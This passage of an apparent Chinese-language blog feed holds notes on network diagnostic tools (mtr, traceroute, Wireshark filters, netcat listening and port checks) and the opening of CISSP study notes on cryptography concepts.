192.168.1.1 and dst port 80</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ping</title>
    <link href="/2024/12/27/network/networktools/ping/"/>
    <url>/2024/12/27/network/networktools/ping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mtr</title>
    <link href="/2024/12/27/network/networktools/mtr/"/>
    <url>/2024/12/27/network/networktools/mtr/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>mtr（My Traceroute）是一款非常有用的网络诊断工具，它结合了 traceroute 和 ping 的功能，可以用来追踪数据包到达目标主机所经过的路径，并同时显示每个跃点（hop）的丢包率和平均往返时间（RTT）。这对于诊断网络问题、了解网络延迟以及定位故障点非常有用。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Debian系统（Ubuntu-Debian）"><a href="#Debian系统（Ubuntu-Debian）" class="headerlink" title="Debian系统（Ubuntu\Debian）"></a>Debian系统（Ubuntu\Debian）</h3><pre><code class="hljs">sudo apt-get updatesudo apt-get install mtr</code></pre><h3 id="x20-Red-Hat系统（Fedora-CentOS-RHEL）"><a href="#x20-Red-Hat系统（Fedora-CentOS-RHEL）" class="headerlink" title="&#x20;Red Hat系统（Fedora, CentOS, RHEL）"></a>&#x20;Red Hat系统（Fedora, CentOS, RHEL）</h3><pre><code class="hljs">sudo dnf install mtrsudo yum install mtr</code></pre><h3 id="Mac系统"><a href="#Mac系统" class="headerlink" title="Mac系统"></a>Mac系统</h3><pre><code class="hljs">brew install mtr</code></pre><h3 id="安装验证"><a href="#安装验证" class="headerlink" title="安装验证"></a>安装验证</h3><pre><code class="hljs">mtr -c 5 8.8.8.8110.local (10.222.28.6) -&gt; 8.8.8.8 (8.8.8.8)                                         2024-07-30T14:55:57+0800Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                                     Packets               Pings Host                                                              Loss%   Snt   Last   Avg  Best  Wrst StDev 1. 10.222.28.254                                                   0.0%     3    5.9   8.7   5.9  12.9   3.7 2. 10.234.253.18                                                   0.0%     3    6.5   6.4   6.0   6.8   0.4 3. 10.234.253.109                                                  0.0%     3    8.9 111.4   8.9 316.5 177.6 4. 61.135.152.129                                                  0.0%     3    9.7  88.7   9.7 244.9 135.3 5. 192.168.255.5                                                  33.3%     3    9.6  10.0   9.6  10.4   0.6 6. 123.125.248.73                                                  0.0%     3   11.6  56.8  11.5 147.3  78.3 7. 221.216.106.109                                                66.7%     3    9.5   9.5   9.5   9.5   0.0 8. 202.96.12.53                                                   50.0%     3   11.4  11.4  11.4  11.4   0.0 9. 219.158.108.242                                                66.7%     3   47.7  47.7  47.7  47.7   0.010. 219.158.8.118                                                   0.0%     3   54.9  51.8  49.3  54.9   2.811. 219.158.103.26                                                  0.0%     3   54.4  53.3  50.9  54.5   2.012. 219.158.6.66                                                    0.0%     3   61.4  59.3  58.1  61.4   1.813. (waiting for reply)14. 162.245.124.254                                                 0.0%     2   60.0  61.6  60.0  63.2   2.315. ae-25.a00.chwahk03.hk.bb.gin.ntt.net                            0.0%     2   80.3  81.8  80.3  83.2   2.116. 203.131.250.82                                                  0.0%     2   52.2  52.9  52.2  53.6   1.017. 142.250.60.155                                                  0.0%     2   53.3  53.8  53.3  54.4   0.818. 108.170.232.111                                                 0.0%     2   51.6  53.1  51.6  54.7   2.219. dns.google         </code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre><code class="hljs">mtr [options] hostname_or_ip</code></pre><p>hostname_or_ip 要追踪的目标主机的域名或 IP 地址</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="c-num-x20"><a href="#c-num-x20" class="headerlink" title="-c num&#x20;"></a>-c num&#x20;</h4><p>限制每个跃点的测试次数。默认情况下，mtr 会持续运行，直到手动停止。</p><h4 id="r-x20"><a href="#r-x20" class="headerlink" title="-r&#x20;"></a>-r&#x20;</h4><p>随机DNS解析结果，防止DNS污染</p><h4 id="w"><a href="#w" class="headerlink" title="-w"></a>-w</h4><p>宽屏幕模式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">HOST</span>: aliyun-<span class="hljs-number">39</span>_106_2_51                   Loss%   Snt   Last   Avg  Best  Wrst StDev<br>  <span class="hljs-attribute">1</span>.|-- <span class="hljs-number">10.36.72.158</span>                         <span class="hljs-number">25</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>    <span class="hljs-number">1</span>.<span class="hljs-number">9</span>   <span class="hljs-number">2</span>.<span class="hljs-number">0</span>   <span class="hljs-number">1</span>.<span class="hljs-number">9</span>   <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>  <span class="hljs-attribute">2</span>.|-- <span class="hljs-number">11.73.7.186</span>                          <span class="hljs-number">75</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>    <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">4</span>   <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">8</span>   <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>  <span class="hljs-attribute">3</span>.|-- <span class="hljs-number">10.102.252.34</span>                         <span class="hljs-number">0</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>   <span class="hljs-number">15</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">6</span>   <span class="hljs-number">1</span>.<span class="hljs-number">9</span>  <span class="hljs-number">15</span>.<span class="hljs-number">2</span>   <span class="hljs-number">3</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="结果解读"><a href="#结果解读" class="headerlink" title="结果解读"></a>结果解读</h3><pre><code class="hljs">Loss%：丢包百分比Snt：发送的数据包总数Last：最后一次测试的往返时间（RTT）Avg：平均往返时间（RTT）Best：最佳往返时间（RTT）Wrst：最差往返时间（RTT）IP address：跃点的 IP 地址</code></pre>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>traceroute</title>
    <link href="/2024/12/27/network/networktools/traceroute/"/>
    <url>/2024/12/27/network/networktools/traceroute/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="traceroute原理"><a href="#traceroute原理" class="headerlink" title="traceroute原理"></a>traceroute原理</h1><p>traceroute是一个网络诊断工具，主要用于跟踪 IP 数据包从源主机到目标主机所经过的路径。它通过发送一系列具有不同生存时间（TTL）值的 UDP 数据包（在某些情况下也可以是 ICMP 数据包）来实现路径追踪。</p><p>当一个数据包的 TTL 值减为 0 时，它会被当前路由器丢弃，并返回一个 ICMP “Time - Exceeded” 消息给源主机。通过分析这些返回的消息，<code>traceroute</code>就可以确定数据包经过的每个路由器的 IP 地址。</p><h1 id="traceroute命令及语法"><a href="#traceroute命令及语法" class="headerlink" title="traceroute命令及语法"></a>traceroute命令及语法</h1><h2 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h2><p>traceroute [选项] 目标主机名或目标IP</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="n"><a href="#n" class="headerlink" title="-n"></a>-n</h3><p>以数字形式显示IP地址，而不去进行DNS反查</p><h3 id="I（大写i）"><a href="#I（大写i）" class="headerlink" title="-I（大写i）"></a>-I（大写i）</h3><p>使用ICMP Echo请求代替UDP数据包进行探测，因为有些网络会限制UDP数据包</p><h3 id="m-NUM"><a href="#m-NUM" class="headerlink" title="-m NUM"></a>-m NUM</h3><p>设置最大跳数，即数据包最多经过的路由器数量。如果超过这个跳数还没有到达目标主机，traceroute 就会停止。例如，traceroute -m 10 8.8.8.8，表示最多追踪 10 个路由器。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><h3 id="初始阶段"><a href="#初始阶段" class="headerlink" title="初始阶段"></a>初始阶段</h3><p>traceroute发送第一个 UDP 数据包，其 TTL 值设置为 1。这个数据包到达路径上的第一个路由器后，TTL 值减为 0，路由器会返回一个 ICMP “Time - Exceeded” 消息给源主机。traceroute记录下这个路由器的 IP 地址，这就是路径中的第一跳。</p><h3 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h3><p>traceroute发送第二个 UDP 数据包，TTL 值设置为 2。这个数据包会经过第一个路由器（TTL 减为 1），然后到达第二个路由器（TTL 减为 0），第二个路由器返回 ICMP “Time - Exceeded” 消息，记录第二个路由器的 IP 地址，即第二跳。这个过程不断重复，每次增加 TTL 值，直到数据包到达目标主机或者达到设置的最大跳数。</p><h3 id="到达目标主机"><a href="#到达目标主机" class="headerlink" title="到达目标主机"></a>到达目标主机</h3><p>当 UDP 数据包最终到达目标主机时，目标主机可能会返回一个 ICMP “Port Unreachable” 消息（因为默认情况下traceroute使用的 UDP 端口可能没有在目标主机上打开），这表示已经成功追踪到目标主机。traceroute会记录下整个路径上的所有路由器的 IP 地址和相应的往返时间（RTT）。</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pathping</title>
    <link href="/2024/12/27/network/networktools/pathping/"/>
    <url>/2024/12/27/network/networktools/pathping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>Windows系统中命令</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wireshark</title>
    <link href="/2024/12/27/network/networktools/wireshark/"/>
    <url>/2024/12/27/network/networktools/wireshark/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><h2 id="过滤ACK报文"><a href="#过滤ACK报文" class="headerlink" title="过滤ACK报文"></a>过滤ACK报文</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.flags.ack <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="过滤指定IP报文"><a href="#过滤指定IP报文" class="headerlink" title="过滤指定IP报文"></a>过滤指定IP报文</h2><p>显示所有目的ip或者来源ip为10.13.8.75的数据包</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ip.addr <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">10.13</span>.<span class="hljs-number">8.75</span><br></code></pre></td></tr></table></figure><h2 id="过滤指定端口"><a href="#过滤指定端口" class="headerlink" title="过滤指定端口"></a>过滤指定端口</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">udp.port <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1900</span> <br></code></pre></td></tr></table></figure><p>显示所有目的端口和来源端口为1900端口的UDP的数据包</p><h2 id="过滤DNS报文"><a href="#过滤DNS报文" class="headerlink" title="过滤DNS报文"></a>过滤DNS报文</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dns</span><br></code></pre></td></tr></table></figure><h2 id="过滤查询指定域名的DNS-Query"><a href="#过滤查询指定域名的DNS-Query" class="headerlink" title="过滤查询指定域名的DNS Query"></a>过滤查询指定域名的DNS Query</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">dns.qry.name <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;www.xiaohongshu.com&quot;</span><br></code></pre></td></tr></table></figure><h2 id="过滤特定-DNS-记录类型"><a href="#过滤特定-DNS-记录类型" class="headerlink" title="过滤特定 DNS 记录类型"></a>过滤特定 DNS 记录类型</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;A&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;AAAA&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;NS&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;TXT&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;MX&quot;</span><br></code></pre></td></tr></table></figure><h2 id="过滤多种协议报文-or"><a href="#过滤多种协议报文-or" class="headerlink" title="过滤多种协议报文 or"></a>过滤多种协议报文 or</h2><p>可以使用 or 关键字连接</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp or icmp</span><br></code></pre></td></tr></table></figure><h2 id="多个过滤条件拼接-or-and"><a href="#多个过滤条件拼接-or-and" class="headerlink" title="多个过滤条件拼接 or and"></a>多个过滤条件拼接 or and</h2><p>可以使用 or 、and关键字连接</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp or dns</span><br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">udp</span> <span class="hljs-keyword">and</span> dns<br></code></pre></td></tr></table></figure><h2 id="过滤-Client-Hello-数据包指定SNI（server-name）"><a href="#过滤-Client-Hello-数据包指定SNI（server-name）" class="headerlink" title="过滤 Client Hello 数据包指定SNI（server name）"></a>过滤 Client Hello 数据包指定SNI（server name）</h2><p>tls.handshake.type &#x3D;&#x3D; 1 过滤出 Client Hello 数据包（TLS握手类型为1）</p><p><img src="/image-20250208110709884.png" alt="image-20250208110709884"></p><p>tls.handshake.extension.type &#x3D;&#x3D; “server_name”  过滤出包含 Server Name Indication（SNI）扩展的数据包</p><p><img src="/image-20250208110832657.png" alt="image-20250208110832657"></p><p>精确匹配 &#x3D;&#x3D; </p><p>tls.handshake.extensions_server_name &#x3D;&#x3D; “具体域名” 过滤出 Server Name 字段为具体域名的数据包</p><p><img src="/image-20250208111230867.png" alt="image-20250208111230867"></p><p>模糊匹配 contains</p><p>如果需要模糊匹配域名，可以使用contains关键字匹配</p><p>tls.handshake.extensions_server_name contanins “关键字”  过滤出 Server Name 字段模糊匹配到关键字的数据包</p><p><img src="/image-20250208111857016.png" alt="image-20250208111857016"></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netcat</title>
    <link href="/2024/12/27/network/networktools/netcat/"/>
    <url>/2024/12/27/network/networktools/netcat/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="debain系统"><a href="#debain系统" class="headerlink" title="debain系统"></a>debain系统</h3><pre><code class="hljs">sudo apt-get install nmap</code></pre><h3 id="Red-Hat系统"><a href="#Red-Hat系统" class="headerlink" title="Red Hat系统"></a>Red Hat系统</h3><pre><code class="hljs">sudo yum install nmap-ncatsudo dnf install nmap-ncat</code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="l-–listen"><a href="#l-–listen" class="headerlink" title="-l –listen"></a>-l –listen</h3><p>开启监听，也就是处于监听端口的状态，并不会对外发起连接</p><h3 id="u-–udp"><a href="#u-–udp" class="headerlink" title="-u –udp"></a>-u –udp</h3><p>监听UDP协议端口，默认监听TCP协议</p><h3 id="p-–source-port-端口号"><a href="#p-–source-port-端口号" class="headerlink" title="-p –source-port 端口号"></a>-p –source-port 端口号</h3><p>指定源端口，也就是本地监听端口号</p><h3 id="v-–verbose-x20"><a href="#v-–verbose-x20" class="headerlink" title="-v –verbose&#x20;"></a>-v –verbose&#x20;</h3><p>Set verbosity level (can be used several times)</p><p>显示执行过程</p><pre><code class="hljs">[root@nvm- ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443^C[root@nvm- ~]# ncat -lp 443</code></pre><h3 id="k-–keep-open"><a href="#k-–keep-open" class="headerlink" title="-k –keep-open"></a>-k –keep-open</h3><p>Accept multiple connections in listen mode</p><p>可以接受多个连接</p><p>默认是单线程的，只允许有单个连接</p><pre><code class="hljs">1、监听单线程443[root@nvm- ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443第一个连接➜  ~ telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.第二个连接➜  /tmp telnet 10.2.2.63 443Trying 10.2.2.63...telnet: connect to address 10.2.2.63: Connection refusedtelnet: Unable to connect to remote host监听连接[root@nvm- ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52072.2、监听多线程443[root@nvm- ~]# ncat -lvkp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443第一个连接➜  ~ telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.第二个连接➜  /tmp telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.监听连接[root@nvm- ~]# ncat -lvkp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52190.Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52191.</code></pre><h3 id="w-–wait"><a href="#w-–wait" class="headerlink" title="-w –wait &lt;time&gt;"></a>-w –wait &lt;time&gt;</h3><p>Connect timeout</p><p>设置连接超时时间</p><h3 id="z-x20"><a href="#z-x20" class="headerlink" title="-z&#x20;"></a>-z&#x20;</h3><p>Zero-I&#x2F;O mode, report connection status only</p><p>没有任何输入输出的模式，只有在扫描通信端口时使用</p><h3 id="n-–nodns"><a href="#n-–nodns" class="headerlink" title="-n –nodns"></a>-n –nodns</h3><p>Do not resolve hostnames via DNS</p><p>不使用DNS解析主机名</p><h2 id="常见示例"><a href="#常见示例" class="headerlink" title="常见示例"></a>常见示例</h2><h3 id="监听UDP端口"><a href="#监听UDP端口" class="headerlink" title="监听UDP端口"></a>监听UDP端口</h3><pre><code class="hljs">ncat --listen --udp 443</code></pre><h3 id="扫描端口开放情况"><a href="#扫描端口开放情况" class="headerlink" title="扫描端口开放情况"></a>扫描端口开放情况</h3><h4 id="TCP端口"><a href="#TCP端口" class="headerlink" title="TCP端口"></a>TCP端口</h4><pre><code class="hljs">nc -zvw time(s) IP sport-eport</code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6-域3安全架构与工程-密码学和对称密钥算法</title>
    <link href="/2024/12/27/security/seccert/cissp/6-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E7%AE%97%E6%B3%95/"/>
    <url>/2024/12/27/security/seccert/cissp/6-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>密码可为已存储（<strong>静态</strong>）、通过网络传输（<strong>传输中&#x2F;动态</strong>）和存在于内存（<strong>使用中&#x2F;处理中</strong>）的敏感信息提供<strong>保密性</strong>、<strong>完整性</strong>、<strong>身份认证</strong>和<strong>不可否认性</strong>保护</p><h2 id="密码学基本知识"><a href="#密码学基本知识" class="headerlink" title="密码学基本知识"></a>密码学基本知识</h2><h3 id="密码学的目标"><a href="#密码学的目标" class="headerlink" title="密码学的目标"></a>密码学的目标</h3><h4 id="保密性confidentiality"><a href="#保密性confidentiality" class="headerlink" title="保密性confidentiality"></a>保密性confidentiality</h4><h5 id="保密性目标"><a href="#保密性目标" class="headerlink" title="保密性目标"></a>保密性目标</h5><p>确保数据在静态、传输中和使用中等三种不同状态下始终保持私密。</p><p>保密性是指为了存储的信息或个人和群体之间的通信保守秘密。</p><h5 id="保密性实现"><a href="#保密性实现" class="headerlink" title="保密性实现"></a>保密性实现</h5><h6 id="对称密码系统symmetric-cryptosystem"><a href="#对称密码系统symmetric-cryptosystem" class="headerlink" title="对称密码系统symmetric cryptosystem"></a>对称密码系统symmetric cryptosystem</h6><p>使用一个共享秘密密钥，提供给密码系统的所有用户。</p><h6 id="非对称密码系统asymmertric-cryptosystem"><a href="#非对称密码系统asymmertric-cryptosystem" class="headerlink" title="非对称密码系统asymmertric cryptosystem"></a>非对称密码系统asymmertric cryptosystem</h6><p>使用为系统每个用户单独组合的公钥和私钥。</p><h5 id="保密性关注的数据"><a href="#保密性关注的数据" class="headerlink" title="保密性关注的数据"></a>保密性关注的数据</h5><h6 id="静态数据（data-at-rest）"><a href="#静态数据（data-at-rest）" class="headerlink" title="静态数据（data at rest）"></a>静态数据（data at rest）</h6><p>被存储的数据，是指驻留在一个永久位置上等待被访问的数据。</p><p>硬盘、备份磁带、云存储服务、USB装置和其他存储介质中的数据</p><p>容易受到物理设备盗窃的影响。</p><h6 id="动态数据（data-in-montion）"><a href="#动态数据（data-in-montion）" class="headerlink" title="动态数据（data in montion）"></a>动态数据（data in montion）</h6><p>线路上的数据（线路是指承载数据通信的网络电缆），是指正在两个系统之间通过网络传送的数据。</p><p>通过公司网络、无线网络或互联网传送的数据</p><p>容易受到窃听的影响。</p><h6 id="使用中的数据（data-in-use）"><a href="#使用中的数据（data-in-use）" class="headerlink" title="使用中的数据（data in use）"></a>使用中的数据（data in use）</h6><p>是指保存在计算机系统活跃内存中，可供系统中运行的进程访问的数据</p><p>容易受到未经授权的进程访问（如果操作系统没有适当隔离不同进程）</p><h4 id="完整性integrity"><a href="#完整性integrity" class="headerlink" title="完整性integrity"></a>完整性integrity</h4><h5 id="完整性目标"><a href="#完整性目标" class="headerlink" title="完整性目标"></a>完整性目标</h5><p>确保数据没有在未经授权的情况下被更改。</p><p>如果完整性机制正常运行，消息的接收者可确定，收到的消息和发出的消息相同。</p><p>完整性检查可确保被存储数据自创建起到被访问时不曾有过更改。</p><p>完整性控制抵御所有形式的更改，其中包括第三方试图插入假信息时进行的有意篡改、有意删除部分数据和因传输过程中的故障而发生的无意更改。</p><h5 id="完整性实现"><a href="#完整性实现" class="headerlink" title="完整性实现"></a>完整性实现</h5><p>通过使用加密的消息摘要来实现，也被称为数据签名（digital signature）</p><h6 id="公钥"><a href="#公钥" class="headerlink" title="公钥"></a>公钥</h6><h6 id="秘密密钥密码系统"><a href="#秘密密钥密码系统" class="headerlink" title="秘密密钥密码系统"></a>秘密密钥密码系统</h6><h4 id="身份认证authentication"><a href="#身份认证authentication" class="headerlink" title="身份认证authentication"></a>身份认证authentication</h4><h5 id="身份认证目标"><a href="#身份认证目标" class="headerlink" title="身份认证目标"></a>身份认证目标</h5><p>用于验证系统用户自称的身份，是密码系统的一项主要功能。</p><h4 id="不可否认性non-repudiation"><a href="#不可否认性non-repudiation" class="headerlink" title="不可否认性non-repudiation"></a>不可否认性non-repudiation</h4><h5 id="不可否认性目标"><a href="#不可否认性目标" class="headerlink" title="不可否认性目标"></a>不可否认性目标</h5><p>向接受者保证：消息发自发送者，而且没有人冒充发送者。</p><p>不可否认性还防止发送者声称自己绝对没有发送过消息（也叫否认消息）。</p><h5 id="不可否认性实现"><a href="#不可否认性实现" class="headerlink" title="不可否认性实现"></a>不可否认性实现</h5><p>公钥或非对称密钥系统提供</p><p>秘密密钥或对称密钥密码系统不提供不可否认性保障，因为参与者都是用的是共享密钥。</p><h3 id="密码学的概念"><a href="#密码学的概念" class="headerlink" title="密码学的概念"></a>密码学的概念</h3><h4 id="密码学术语"><a href="#密码学术语" class="headerlink" title="密码学术语"></a>密码学术语</h4><h5 id="明文消息P（plaintext）"><a href="#明文消息P（plaintext）" class="headerlink" title="明文消息P（plaintext）"></a>明文消息P（plaintext）</h5><h5 id="密文消息C（ciphertext）"><a href="#密文消息C（ciphertext）" class="headerlink" title="密文消息C（ciphertext）"></a>密文消息C（ciphertext）</h5><h5 id="加密（encrypt"><a href="#加密（encrypt" class="headerlink" title="加密（encrypt )"></a>加密（encrypt )</h5><h5 id="解密（decrypt）"><a href="#解密（decrypt）" class="headerlink" title="解密（decrypt）"></a>解密（decrypt）</h5><h5 id="密钥（key）"><a href="#密钥（key）" class="headerlink" title="密钥（key）"></a>密钥（key）</h5><p>所有的密码算法都靠密钥维持安全。</p><p>多数情况下，密钥是一个极大的二进制数。</p><p><strong>密钥空间</strong>：每种算法都有一个特定密钥空间（key space）。</p><p>密钥空间是一个特定的数值范围，而某一特定算法的密钥在这个范围内才有效。</p><p>密钥空间由位大小（bit size）决定，也就是密钥内二进制位（0 和 1）的数量。</p><p>密钥空间指的是从全 0 密钥到全 1 密钥的范围，也就是从 0 到 2 n 次方的数范围，其中 n 是密钥的位大小。</p><p>事实上，从密码得到的安全保护完全取决于为所用密钥保守秘密的能力。</p><h4 id="科克霍夫原则"><a href="#科克霍夫原则" class="headerlink" title="科克霍夫原则"></a>科克霍夫原则</h4><p>所有的密码都依赖算法，算法（algorithm）也就是一套规则，通常是数学规则，规定了加密和解密过程应该怎么进行。</p><p>科克霍夫原则（Kerckhoffs’s principle）也叫科克霍夫假说，只要密钥不被被人掌握，那么即便有关密码系统的一切都是公开的，密码系统也是安全的。</p><h4 id="私钥（也叫秘密密钥）密码系统"><a href="#私钥（也叫秘密密钥）密码系统" class="headerlink" title="私钥（也叫秘密密钥）密码系统"></a>私钥（也叫秘密密钥）密码系统</h4><p>所有参与者使用一个共享密钥</p><h4 id="公钥密码系统"><a href="#公钥密码系统" class="headerlink" title="公钥密码系统"></a>公钥密码系统</h4><p>每个参与者各有一个密钥对</p><h4 id="密码变量（cryptovariable）-密码密钥"><a href="#密码变量（cryptovariable）-密码密钥" class="headerlink" title="密码变量（cryptovariable）&#x3D;&#x3D; 密码密钥"></a>密码变量（cryptovariable）&#x3D;&#x3D; 密码密钥</h4><h4 id="密码术（cryptography）"><a href="#密码术（cryptography）" class="headerlink" title="密码术（cryptography）"></a>密码术（cryptography）</h4><p>创建和执行秘密代码和密码的技艺</p><h4 id="密码分析（cryptanalysis）"><a href="#密码分析（cryptanalysis）" class="headerlink" title="密码分析（cryptanalysis）"></a>密码分析（cryptanalysis）</h4><p>研究如何打败代码和密码</p><h4 id="密码学（cryptology）"><a href="#密码学（cryptology）" class="headerlink" title="密码学（cryptology）"></a>密码学（cryptology）</h4><p>密码术+密码分析</p><h4 id="密码系统（cryptosystem）"><a href="#密码系统（cryptosystem）" class="headerlink" title="密码系统（cryptosystem）"></a>密码系统（cryptosystem）</h4><p>一种代码或密码在硬件和软件中的具体实现</p><h3 id="密码数学"><a href="#密码数学" class="headerlink" title="密码数学"></a>密码数学</h3><h4 id="布尔数学（Boolean-mathermatics）"><a href="#布尔数学（Boolean-mathermatics）" class="headerlink" title="布尔数学（Boolean mathermatics）"></a>布尔数学（Boolean 